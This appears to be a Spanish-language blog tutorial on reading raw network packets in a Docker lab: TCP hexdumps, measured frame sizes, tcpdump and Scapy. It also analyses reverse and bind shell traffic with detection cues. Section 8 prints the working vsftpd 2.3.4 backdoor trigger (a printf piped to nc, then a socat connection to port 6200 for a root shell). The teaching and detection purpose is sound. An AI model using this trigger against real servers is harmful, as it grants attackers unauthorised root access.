---
layout: single
title: "Packet anatomy: leer el cable byte a byte (TCP, C2 y un vsftpd explotado)"
date: 2026-10-13
categories: [tutoriales, dockerlabs]
tags: [tcp, red, scapy, tcpdump, wireshark, pcaps, c2, cve-2011-2523]
excerpt: "Lab en Docker para leer paquetes en crudo: anatomía byte a byte de un SYN, tamaños reales medidos en pcaps, reverse/bind shells y el backdoor de vsftpd 2.3.4 con root en 29 paquetes."
permalink: /tutoriales/packet-anatomy/
---

Todo lo que vas a leer está medido sobre pcaps reales capturados el 2026-10-13 en el
lab que acompaña a este post: **[gumerzzzindo/packet-anatomy](https://github.com/gumerzzzindo/packet-anatomy)** —
dockerizado, con las demos y los pcaps listos para Wireshark. Nada de cifras de
libro: números que salieron del cable… bueno, del veth, que es lo más parecido.

```bash
git clone https://github.com/gumerzzzindo/packet-anatomy
cd packet-anatomy && docker compose up -d --build
```

## 0. La idea falsa más común

Cuando decimos "paquete" casi siempre estamos hablando de tres cosas distintas a la vez.
En el cable viajan **tramas** Ethernet; dentro de ellas, **paquetes** IP; dentro de los
paquetes, **segmentos** TCP (o datagramas UDP); y dentro, el payload de la aplicación.
Muñeco ruso:

```
┌ trama Ethernet ── 14 B de cabecera ──────────────────────────────┐
│  ┌ IPv4 ── 20 B (mínimo) ────────────────────────────┐            │
│  │  ┌ TCP ── 20 B (mín.) a 60 B con opciones ───┐    │            │
│  │  │   payload de la app: hasta 1460 B (MSS)   │    │            │
│  │  └───────────────────────────────────────────┘    │            │
│  └───────────────────────────────────────────────────┘            │
└───────────────────────────────────────────────────────────────────┘
```

Dos detalles que nadie te cuenta y muerden al medir:

- En el cable real se añaden **8 B de preamble + 12 B de IFG** que tcpdump y los pcaps
  no enseñan (viven por debajo de lo que la NIC enseña al driver).
- El **FCS** (4 B de checksum de Ethernet) se recorta antes de que el paquete llegue a
  tu captura. Por eso un "frame de 6 bytes" en Wireshark a veces parece cojo.

## 1. TCP byte a byte: estructura

La cabecera TCP mínima son **20 bytes**. Campo a campo:

| offset | campo | bytes | qué es |
|---|---|---|---|
| 0–1 | puerto origen | 2 | quién transmite |
| 2–3 | puerto destino | 2 | quién recibe (80, 22, 53…) |
| 4–7 | número de secuencia | 4 | posición en el stream |
| 8–11 | número de ack | 4 | "hasta aquí he recibido" |
| 12–13 | data-offset + reservado + **flags** | 2 | tamaño de cabecera en palabras de 4 B; los flags (SYN, ACK, FIN, RST, PSH, URG) |
| 14–15 | ventana | 2 | control de flujo |
| 16–17 | checksum | 2 | integridad (pseudo-cabecera + segmento) |
| 18–19 | urgent pointer | 2 | casi historia, casi siempre 0 |

Los flags son un byte de bits encendidos: `0x02` SYN, `0x10` ACK, `0x01` FIN, `0x04`
RST, `0x08` PSH. En hexdump verás cosas como `a002` (offset 40 B + SYN) o `8018`
(offset 32 B + PSH|ACK).

### El SYN real de nuestro lab, anotado

Capturado con `tcpdump -XX` (frame completo, 74 bytes: 14 de Ethernet + 60 de IP):

```
0x0000:  0242 0a09 092a 0242 0a09 0902 0800 4500  .B...*.B......E.
0x0010:  003c 6a9c 4000 4006 a9e2 0a09 0902 0a09  .<j.@.@.........
0x0020:  092a ed56 0050 6281 67da 0000 0000 a002  .*.V.Pb.g.......
0x0030:  faf0 266c 0000 0204 05b4 0402 080a 3d34  ..&l..........=4
0x0040:  06c9 0000 0000 0103 0307                 ..........
```

- `0242 0a09 092a` / `0242 0a09 0902` — MAC destino y origen
- `0800` — ethertype IPv4
- `45` — versión 4, IHL 5 (20 bytes de IPv4, sin opciones)
- `003c` — longitud total IP = 60 (¡ojo: sin contar Ethernet!)
- `4000` — flags/fragmento (DF), `40` TTL (64), `06` protocolo TCP
- `0a090902` / `0a09092a` — IPs origen/destino (10.9.9.2 → 10.9.9.42)
- `ed56` `0050` — puertos: 60758 → 80
- `6281 67da` — seq inicial, `0000 0000` — ack
- `a002` — offset 10 palabras (40 B de TCP) + flag SYN
- `faf0` — ventana 64240, `266c` checksum
- opciones: `02 04 05b4` = **MSS 1460**, `04 02` = SACK-permitted, `08 0a …` = timestamps, `01` nop, `03 03 07` = **wscale 7**

Los 20 bytes de opciones del SYN son la razón de que un SYN pese 74 B cuando el SYN
"pelado" (sin opciones) pesa 54. Medido, no adivinado: nuestro SYN de Scapy sin opciones
fue de 54, el curl con opciones de 74.

### El handshake con números reales

```
SYN      seq 3899180868            → "quiero una conexión"
SYN-ACK  seq 35397486, ack 3899180869  → "vale, y he oído hasta ahí"
ACK      ack 35397487              → "confirmado, charlemos"
```

Detalle fino: **SYN y FIN consumen un número de secuencia** cada uno, aunque no lleven
datos. Por eso después del SYN todo suma +1.

### HTTP en claro, tal cual lo lees

El mismo tcpdump enseña el payload sin hacer nada:

```
GET / HTTP/1.1
Host: web
User-Agent: curl/8.14.1
Accept: */*
```

Con HTTPS la estructura es idéntica (danza de flags incluida): lo único que cambia es
que el payload son bytes ilegibles. El transporte no sabe de aplicación.

## 2. SSH vs DHCP: la diferencia real es TCP vs UDP

Pregunta con trampa: SSH y DHCP son los dos protocolos de *aplicación*. Lo que hace que
sus paquetes parezcan de mundos distintos es el **transporte** que eligen.

| | SSH | DHCP |
|---|---|---|
| transporte | **TCP** (puerto 22) | **UDP** (67 servidor, 68 cliente) |
| conexión | 3-way handshake + sesión persistente cifrada | sin conexión: 4 mensajes DORA y a otra cosa |
| fiabilidad | retransmisión y orden garantizados por TCP | si se pierde, repite el cliente con sus timers |
| broadcast | unicast exclusivo | el Discover necesita `ff:ff:ff:ff:ff:ff` |
| cabecera de transporte | 20–60 B (seq, ack, flags, ventana…) | 8 B y santas pascuas |
| tamaño típico | banner + KEXINIT: **514 B** en el lab | Discover mínimo: **292 B** |

Tres cosas que el lab dejó a la vista:

**1) El banner de SSH viaja sin cifrar.** Nuestro paquete de 580 B lleva el
`SSH-2.0-dropbear_2024.85` (26 B) más el KEXINIT con todas las suites de cifrado en
texto plano (`curve25519-sha256`, `chacha20-poly1305@openssh.com`…). La criptografía
arranca *después* del key exchange; en el mismo pcap puedes ver el momento exacto en
que el payload pasa de "lectible" a ruido.

**2) TCP retransmite de verdad, y se puede ver.** Al hacer el handshake a mano con
Scapy y no confirmar bien, el servidor retransmitió el banner **5 veces** con backoff
duplicado: +250 ms, +500 ms, +1 s, +2 s. Eso es TCP trabajando con tus propios ojos.
UDP habría soltado el paquete y punto.

**3) DHCP no vuela en Docker… y eso también enseña.** El daemon asigna IPs programando
directamente la veth del contenedor, así que el Discover que construimos con Scapy
(292 B, broadcast a `ff:ff:ff:ff:ff:ff`) salió a la red y murió en silencio. En una LAN
real verías la danza DORA: Discover → Offer → Request → Ack, con los puertos 68 → 67.

## 3. Tamaños reales: chuletón medido

Frame completo tal y como lo vio tcpdump (Ethernet incluida):

| demo | paquete | frame (B) | desglose |
|---|---|---|---|
| HTTP | SYN (20 + 20 de opciones) | **74** | 14 + 20 + 40 |
| HTTP | SYN-ACK | **74** | idem |
| HTTP | ACK puro (con timestamps) | **66** | 14 + 20 + 32 |
| HTTP | `GET /` | **133** | 67 B de HTTP |
| HTTP | respuesta `200 OK` cabecera | **303** | 237 B de headers |
| HTTP | respuesta cuerpo | **243** | 177 B de HTML |
| SSH | banner (26) + KEXINIT (488) | **580** | 514 B de payload |
| DNS | query A `target.lab` | **70** | 28 B de DNS |
| DNS | respuesta con un A | **86** | 44 B de DNS |
| ICMP | echo request/reply (payload 32) | **74** | 8 + 32 de ICMP |
| ARP | request / reply | **42** | 28 B de ARP |
| DHCP | Discover (Scapy) | **292** | BOOTP 236 + cookie 4 + opciones |
| raw | SYN "pelado" sin opciones | **54** | 14 + 20 + 20 |

Chuleta de cabeceras mínimas:

- **Ethernet II: 14 B** (+8 preamble/+12 IFG en el cable, −4 FCS recortado)
- **IPv4: 20 B** (hasta 60 con opciones) · **IPv6: 40 B**
- **TCP: 20 B** (hasta 60) · **UDP: 8 B** · **ICMP: 8 B**
- **ARP: 28 B** de payload (42 B con Ethernet)
- **DNS: 12 B** de cabecera + pregunta · **BOOTP/DHCP: 236 B** + cookie + opciones

Cuentas útiles, todas verificadas en el lab:

- MSS TCP v4 = MTU 1500 − IP 20 − TCP 20 = **1460** (salió exactamente ese en el SYN)
- UDP: payload útil máximo = 1500 − 20 − 8 = **1472**
- Con IPv6 la resta cambia: TCP MSS = **1440**
- El ping clásico (`-s 32`) es 74 B; el que traen por defecto (56 de payload) es **98 B**

## 4. Leer en crudo sin volverse loco

```bash
tcpdump -i eth0 -n -e -XX "tcp port 80"     # hex completo con cabeceras
tcpdump -i eth0 -n -e -w demo.pcap "udp port 53"   # a pcap para Wireshark
tcpdump -e -n -r demo.pcap                   # lista con tamaños
tshark -r demo.pcap -V                        # dissection completa
```

- `-e` enseña la capa Ethernet (MACs y ethertype) — sin ella no ves el sobre exterior.
- `-XX` vuelca hex + ascii de TODO el frame, cabeceras incluidas.
- El formato pcap lleva una cabecera global de 24 B y 16 B por registro (con timestamps).
  Si capturas con `-s 96`, Wireshark distinguirá "bytes capturados" vs "bytes
  originales" — otro lío resuelto de primeras.

Los `.pcap` viven en el repo (`pcaps/`) — descarga los que quieras y ábrelos con Wireshark en cualquier portátil.

## 5. Crear paquetes con Scapy

La idea es simple: las capas se apilan con `/`. Lo que no rellenes, lo calcula Scapy
(longitudes, checksums con cuidado, etc.).

```python
from scapy.all import *

# query DNS
sr1(IP(dst="10.9.9.53")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="target.lab")))

# DHCP Discover (L2 manual para controlar el broadcast)
sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")
      /UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=macb)
      /DHCP(options=[("message-type","discover"),("end")]))

# handshake TCP a mano
synack = sr1(IP(dst="10.9.9.23")/TCP(sport=42424, dport=22, flags="S", seq=1000))
send(IP(dst=...)/TCP(sport=42424, dport=22, flags="A", seq=1001, ack=synack.seq+1))
```

El pitfall que te ahorra una tarde: **el kernel manda RSTs fantasma**. Tú abres un SYN
por raw socket, llegar el SYN-ACK… y el kernel, que no conoce esa conexión, responde
RST por su cuenta. Solución:

```bash
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```

Después de eso, el banner de SSH se lee sin ninguna librería SSH:
solo bytes que llegan por el cable y tú esperando con `sniff()`.

## 6. El lab, para repetirlo en casa

Cuatro contenedores en una bridge aislada (10.9.9.0/24): `sniffer` (python + scapy +
tcpdump, con NET_RAW/NET_ADMIN), `web` (nginx), `sshd` (dropbear), `dns` (dnsmasq).

```bash
git clone https://github.com/gumerzzzindo/packet-anatomy
cd packet-anatomy && docker compose up -d --build
docker compose exec sniffer bash /opt/lab/demo.sh http "tcp port 80" "curl -s http://web/"
```

En el `README.md` del repo están todas las demos (HTTP, banner SSH, DNS, ping+ARP,
DHCP con Scapy, handshake a mano y la anatomía en hex), las trampas conocidas y cómo
limpiar. Dos trampas genéricas de capturar en Docker: el bridge aprende MACs, así que
no verás el tráfico unicast ajeno (captura desde el propio hablante), y no existe DHCP
en la red bridge.

## 7. Y el C2: cuando una shellcode viaja por la red

Una shellcode TCP (reverse shell) hace esto en el kernel antes de que el primer paquete
salga: `socket()` → `connect()` hacia el C2 (o `listen()`/`accept()` si es bind) →
`dup2(fd, 0)` `dup2(fd, 1)` `dup2(fd, 2)` (enchufa stdin/stdout/stderr al socket) →
`execve("/bin/sh")`. A partir de ahí, la red no puede distinguir eso de un socat: lo
vuelca tal cual. Y eso es lo que capturamos.

Lo que dejó el `pcap de la reverse shell` (la víctima es 10.9.9.5, el atacante es
10.9.9.2:

- **El SYN sale de la VÍCTIMA**: `10.9.9.5.x > 10.9.9.2.4444: Flags [S]`. Esa direción
  del SYN es LA firma behavioral del C2: un servidor que llama hacia fuera.
- **Cero banner**: no pasa nada por 4444 hasta que el shellcode del atacante habla;
  el SSH saludaba con 26 B de nombre y versión. Aquí: silencio.
- Los comandos son minúsculos y en claro: `id\n` son **3 bytes de payload** (frame de
  69), el C2 lo recibe y la respuesta de la shell sale igual de legible: `uid=0(root)
gid=0(root)…` (130 B de payload, frame 196). En Wireshark, **Follow TCP Stream** y
  la sesión completa se lee como un guion.
- `hostname` (9 B → frame 75) y su respuesta `f85d216e13bd` (13 B → 79); `uname -a`
  (9 → 75) con respuesta de kernel y distro en 107 B → 173.

La **bind shell** es la misma conversación con el coreógrafo invertido: la víctima
escucha en 4444 y el SYN sale del ATACANTE (`10.9.9.2 > 10.9.9.5.4444`). Mismos tamaños,
misma charla — lo que cambia es **quién manda el SYN**. Para un SIEM: una bind shell es
un puerto nuevo escuchando en un servidor (lo ves en state dumps); una reverse shell es
un SYN saliente (lo ves en NDR/netflow). Dos señales distintas, misma mierda.

Y la misma shell envuelta en TLS (el C2 disfrazado):

| tráfico | payload | frame |
|---|---|---|
| ClientHello | 408 B | 474 |
| ServerHello + certificado (RSA 2048) | 1358 B | 1424 |
| trozos del cert/kex + ChangeCipherSpec | 80/255/25/255 B | 146/321/91/321 |
| `id` CIFRADO (TLS 1.3: 3 B → record completo) | 31 B | 97 |
| respuesta cifrada | 35 B | 101 |

Tres bytes de comando se vuelven 31 en el cable (cabecera TLS 5 + nonce + tag de
autenticación). El coreógrafo TCP es idéntico; el contenido, ilegible. **Por eso el C2
real lleva TLS** y por eso el tráfico en claro que capturamos antes es un regalo para
cualquier SOC.

Breadcrumbs de detección que salen de este mismo lab:

- SYN **saliente** desde servidores hacia puertos raros (reverse) o puertos escucha
  nuevos (bind).
- PSH diminutas alternando dirección, sin banner de aplicación y sin negociación TLS
  (C2 en claro).
- TLS con certificado self-signed / cadenas raras / sin SNI — el handshake de 474 +
  1424 B del socat con cert casero no se parece al de un SaaS real.

Chuleta socat que nos costó tres iteraciones medir este capítulo: **socat necesita
SIEMPRE dos direcciones**. El listener es `socat TCP-LISTEN:4444,reuseaddr -` (¡con el
`-` de stdio!) y el cliente `socat - TCP:host:puerto`. Con una sola dirección muere al
arrancar con `exactly 2 addresses required`, y tu pcap se queda vacío — otro regalo
de este lab.

## 8. Un exploit de verdad: vsftpd 2.3.4 y su backdoor (CVE-2011-2523)

Junio de 2011: durante ~48h, el tarball oficial de vsftpd 2.3.4 llevaba
troyanizado. Una línea de magia negra en el parser: si el usuario de FTP acababa
en `:)`, un `fork()` nacía un hijo que **abrirá una shell como root en el puerto
6200**. El exploit entero cabe en un printf:

```
printf 'USER roger:)\r\nPASS x\r\n' | nc <target> 21
# …y un rato después…
socat - TCP:<target>:6200
```

Como el tarball de entonces es material de museo, en el lab compilamos una
**réplica fiel** (~90 líneas de C): mismo banner `220 (vsFTPd 2.3.4)`, mismo
trigger, misma shell bind en 6200. A nivel de red, el pcap es indistinguable
del del original — y eso es lo único que nos interesa medir.

Lo que dejó el `pcap de la explotación` (víctima 10.9.9.21, atacante 10.9.9.2):

| tráfico | payload | frame |
|---|---|---|
| banner FTP: `220 (vsFTPd 2.3.4)` | 20 B | **86** |
| trigger completo (USER+PASS, un paquete) | 22 B | **88** |
| respuesta `530 Please login with USER and PASS.` | 38 B | 104 |
| FIN de la sesión de control | — | 66 |
| **3s después: SYN hacia 6200** (dirección bind) | — | **74** |
| `id\n` | 3 B | 69 |
| **`uid=0(root)` — como un señor** | 39 B | **105** |
| `hostname` / `pak-vsftpd` | 9 / 11 B | 75 / 77 |
| `uname -a` / `Linux pak-vsftpd…` | 9 / 109 B | 75 / 175 |

Total: 29 paquetes para pasar de curiosidad a shell root, con la prueba del
algodón en el hexdump — `uid=0(root)` y `Linux pak-vsftpd` legibles en el ASCII
del ascii del dump.

Tres lecciones de red que este experimento regala:

- **El trigger delata al exploit en la capa 7**: el `:)` viaja en CLARO por el
  puerto 21. Es la firma de IDS de libro — la regla Snort clásica de este CVE
  dispara con un `content: ":)"` en el FTP. Aquí se ve tal cuál: `FTP: USER
  roger:)` en el dump, con el tcpdump ya decodificándolo.
- **El backdoor delata el backdoor en la capa 3/4**: dos segundos después de un
  `:)` aparece un SYN NUEVO desde fuera hacia el 6200 — igual que la bind shell
  del capítulo 7, la dirección del SYN es el chivatazo. Un FTP que recibe una
  conexión entrante a un puerto no estándar tras un login fallido es un
  incidente esperando el ticket.
- **El root es herencia de la capa de proceso**: la shell del 6200 es root
  porque el daemon FTP corre como root — el exploit no hace privesc, lo
  hereda. Corre tu FTP como usuario sin privilegios y el mismo bug da otra
  cosa muy distinta.

Detalle para no morderse: en el lab el backdoor queda vivo en el contenedor
(como su hermano de 2011 que sobrevivió al cierre del FTP — por eso era tan
persistente). Limpieza: `docker compose restart vsftpd`.

## Cierre

La próxima vez que alguien diga "hay algo raro en la red", ya no lo mirarás por
fuera: abrirás el sobre, contarás los bytes y sabrás si pesa 54, 66, 74 o 292… y por
qué. El cable deja de ser una caja negra el día que construyes tu primer paquete a mano
y lo ves entero en el hexdump.

**Próximos pasos naturales**: IPv6 y su cabecera fija de 40 B, opciones TCP a fondo
(SACK, window scaling y cómo afectan a la latencia), reassembly de streams, y QUIC
(que mete todo ese "TCP" hablado dentro de UDP).